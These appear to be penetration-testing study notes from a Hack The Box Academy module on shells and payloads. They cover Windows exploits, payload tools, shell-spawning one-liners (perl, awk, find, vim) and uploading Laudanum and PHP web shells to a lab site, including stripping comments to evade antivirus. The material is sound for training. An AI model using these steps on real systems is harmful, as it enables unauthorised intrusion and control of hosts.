Many different command language interpreters can be used, some of which are also called `shell scripting languages` or `Command and Scripting interpreters` as defined in the [Execution techniques](https://attack.mitre.org/techniques/T1059/) of the `MITRE ATT&CK Matrix`. We do not need to be software developers to understand these concepts, but the more we know, the more success we can have when attempting to exploit vulnerable systems to gain a shell session.



#### Bind Example

![Bind shell setup: Pentester's system 10.10.14.15 connects to target 10.10.14.20:1337 using netcat command.](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

As seen in the image, we would connect directly with the `IP address` and `port` listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider:

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

# Infiltrating Windows



Since many of us can remember, Microsoft has dominated the home and enterprise markets for computing. In modern days, with the introduction of improved Active Directory features, more interconnectivity with cloud services, Windows subsystem for Linux, and much more, the Microsoft attack surface has grown as well.

For example, just in the last five years, there have been `3688` reported vulnerabilities just within Microsoft Products, and this number grows daily. This table was derived from [HERE](https://www.cvedetails.com/vendor/26/Microsoft.html)
## Prominent Windows Exploits

Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let's discuss those for a minute:

| **Vulnerability** | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ----------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MS08-067`        | MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.                                                                                                                                                                                      |
| `Eternal Blue`    | MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.                                                                                                |
| `PrintNightmare`  | A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it [here](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).                                                                                          |
| `BlueKeep`        | CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.                                                                                                                                                                                                                                                     |
| `Sigred`          | CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.                                                                                                                                                                                                   |
| `SeriousSam`      | CVE 2021-36934 exploits an issue with the way Windows handles permission on the `C:\Windows\system32\config` folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. |
| `Zerologon`       | CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.              |
## Bats, DLLs, & MSI Files, Oh My!

When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Each file type can accomplish different things for us, but what they all have in common is that they are executable on a host. Try to keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.

#### Payload Types to Consider

- [DLLs](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
    
- [Batch](https://commandwindows.com/batch.htm) Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of `.bat`. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.
    
- [VBS](https://www.guru99.com/introduction-to-vbscript.html) VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
    
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI` files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run `msiexec` to execute our file, which will provide us with further access, such as an elevated reverse shell.
    
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1) Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.
    

Now that we understand what each type of Windows file can be used for let's discuss some basic tools, tactics, and procedures for building our payloads and delivering them onto the host to land a shell.


#### Payload Generation

We have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very handy way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.

| **Resource**                      | **Description**                                                                                                                                                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `MSFVenom & Metasploit-Framework` | [Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. |
| `Payloads All The Things`         | [Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.                                                                                                                                        |
| `Mythic C2 Framework`             | [Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.                                                                                                                    |
| `Nishang`                         | [Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.                                                                                                                  |
| `Darkarmour`                      | [Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.                                                                                                                                                                    |
#### Payload Transfer and Execution:

Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.

- `Impacket`: [Impacket](https://github.com/SecureAuthCorp/impacket) is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with `psexec`, `smbclient`, `wmi`, Kerberos, and the ability to stand up an SMB server.
- [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): is a great resource to find quick oneliners to help transfer files across hosts expediently.
- `SMB`: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
- `Remote execution via MSF`: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
- `Other Protocols`: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

At the end of the last section, we established a shell session with the target. Initially, our shell was limited (sometimes referred to as a jail shell), so we used python to spawn a TTY bourne shell to give us access to more commands and a prompt to work from. This will likely be a situation we find ourselves in more and more as we practice on Hack The Box and in the real world on engagements.

There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. Let's examine some of them.

Know that whenever we see `/bin/sh` or `/bin/bash`, this could also be replaced with the binary associated with the shell interpreter language present on that system. With most Linux systems, we will likely come across `bourne shell` (`/bin/sh`) and `bourne again shell` (`/bin/bash`) present on the system natively.

### /bin/sh -i

This command will execute the shell interpreter specified in the path in interactive mode (`-i`).

#### Interactive

Spawning Interactive Shells

```bash
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

## Perl

If the programming language [Perl](https://www.perl.org) is present on the system, these commands will execute the shell interpreter specified.

#### Perl To Shell

Spawning Interactive Shells

```bash
perl —e 'exec "/bin/sh";'
```


## Ruby

If the programming language [Ruby](https://www.ruby-lang.org/en/) is present on the system, this command will execute the shell interpreter specified:

#### Ruby To Shell

Spawning Interactive Shells

```bash
ruby: exec "/bin/sh"
```


If the programming language [Lua](https://www.lua.org) is present on the system, we can use the `os.execute` method to execute the shell interpreter specified using the full command below:

#### Lua To Shell

Spawning Interactive Shells

```bash
lua: os.execute('/bin/sh')
```
## AWK
```bash
awk 'BEGIN {system("/bin/sh")}'
```


## Find

[Find](https://man7.org/linux/man-pages/man1/find.1.html) is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.

#### Using Find For A Shell

Spawning Interactive Shells

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```


## VIM

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`. This is a very niche situation we would find ourselves in to need to use this method, but it is good to know just in case.

#### Vim To Shell

Spawning Interactive Shells

```bash
vim -c ':!/bin/sh'
```


```bash
vim
:set shell=/bin/sh
:shell
```


#### Sudo -l

Spawning Interactive Shells

```bash
sudo -l
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

# Laudanum, One Webshell to Rule Them All



Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include `asp, aspx, jsp, php,` and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it [here](https://github.com/jbarcia/Web-Shells/tree/master/laudanum). Let's examine Laudanum and see how it works.


## Working with Laudanum

The Laudanum files can be found in the `/usr/share/laudanum` directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run. For specific files such as the shells, you must edit the file first to insert your `attacking` host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell. Before using the different files, be sure to read the contents and comments to ensure you take the proper actions.



## Laudanum Demonstration

Now that we understand what Laudanum is and how it works, let's look at a web application we have found in our lab environment and see if we can run a web shell. If you wish to follow along with this demonstration, you will need to add an entry into your `/etc/hosts` file on your attack VM or within Pwnbox for the host we are attacking. That entry should read: `<target ip> status.inlanefreight.local`. Once this is done, you can play and explore this demonstration as long as you are on the VPN or using Pwnbox.

#### Move a Copy for Modification

Laudanum, One Webshell to Rule Them All

```shell-session
c0derpwner@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

Add your IP address to the `allowedIps` variable on line `59`. Make any other changes you wish. It can be prudent to remove the ASCII art and comments from the file. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.

#### Modify the Shell for Use

We are taking advantage of the upload function at the bottom of the status page(`Green Arrow`) for this to work. Select your shell file and hit upload. If successful, it should print out the path to where the file was saved (Yellow Arrow). Use the upload function. Success prints out where the file went, navigate to it.

#### Take Advantage of the Upload Function

![The image shows a server status page with BIOS, disk, and services information. Several services are marked as "Stopped" in red. A section for importing configuration files is highlighted with a yellow arrow pointing to the file path and a green arrow pointing to the "Upload File" button.](https://academy.hackthebox.com/storage/modules/115/laud-upload.png)

Once the upload is successful, you will need to navigate to your web shell to utilize its functions. The image below shows us how to do it. As seen from the last image, our shell was uploaded to the `\\files\` directory, and the name was kept the same. This won't always be the case. You may run into some implementations that randomize filenames on upload that do not have a public files directory or any number of other potential safeguards. For now, we are lucky that's not the case. With this particular web application, our file went to `status.inlanefreight.local\\files\demo.aspx` and will require us to browse for the upload by using that \ in the path instead of the / like normal. Once you do this, your browser will clean it up in your URL window to appear as `status.inlanefreight.local//files/demo.aspx`.

#### Navigate to Our Shell

![The image shows a Laundanum ASPX Shell interface with a command input field labeled "cmd /c" and a "Submit Query" button. A green arrow points to the URL "status.inlanefreight.local/files/demo.aspx" in the browser's address bar.](https://academy.hackthebox.com/storage/modules/115/laud-nav.png)

We can now utilize the Laudanum shell we uploaded to issue commands to the host. We can see in the example that the `systeminfo` command was run.

#### Shell Success

![The image shows a Laundanum ASPX Shell interface displaying system information. It includes details like host name, OS version, manufacturer, system type, processor, memory, and network card information. The command "systeminfo" is executed, and the output is shown under "STDOUT" in the browser window.](https://academy.hackthebox.com/storage/modules/115/laud-success.png)






## ASPX and a Quick Learning Tip

Before diving into aspx shell concepts and exercises, we should take the time to cover a learning resource that can help reinforce most of the concepts covered here in HTB Academy. Occasionally it can be a challenge to visualize a concept using just one learning method. It is good to supplement reading with watching demonstrations and performing hands-on as we have been doing thus far. Video walkthroughs can be an amazing way to learn concepts, plus they can be consumed casually (eating lunch, laying in bed, sitting on the couch, etc.). One great resource to use in learning is `IPPSEC's` blog site [ippsec.rocks](https://ippsec.rocks/?#). The site is a powerful learning tool. Take, for example, the concept of web shells. We can use his site to type in the concept we want to learn, like aspx.![[IPPSEC.png]]

## ASPX Explained

`Active Server Page Extended` (`ASPX`) is a file type/extension written for [Microsoft's ASP.NET Framework](https://docs.microsoft.com/en-us/aspnet/overview). On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let's witness this first-hand by utilizing the Antak Webshell.


Antak is a web shell built-in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let's keep our eyes on `Antak`. Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. The UI is even themed like PowerShell. It's time to dive in and experiment with Antak.











# PHP Web Shells

---

Hypertext Preprocessor or [PHP](https://www.php.net) is an open-source general-purpose scripting language typically used as part of a web stack that powers a website. At the time of this writing (October 2021), PHP is the most popular `server-side programming language`. According to a [recent survey](https://w3techs.com/technologies/details/pl-php) conducted by W3Techs, "PHP is used by `78.6%` of all websites whose server-side programming language we know".

Let's consider a practical example of filling out the user account and password fields on a login web form.

We will be using [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). We can download this or copy and paste the source code into a `.php` file. Keep in mind that the file type is significant, as we will soon witness. Our goal is to upload the PHP web shell via the Vendor Logo `browse` button. Attempting to do this initially will fail since rConfig is checking for the file type. It will only allow uploading image file types (.png,.jpg,.gif, etc.). However, we can bypass this utilizing `Burp Suite`.

Start Burp Suite, navigate to the browser's network settings menu and fill out the proxy settings. `127.0.0.1` will go in the IP address field, and `8080` will go in the port field to ensure all requests pass through Burp (recall that Burp acts as the web proxy).
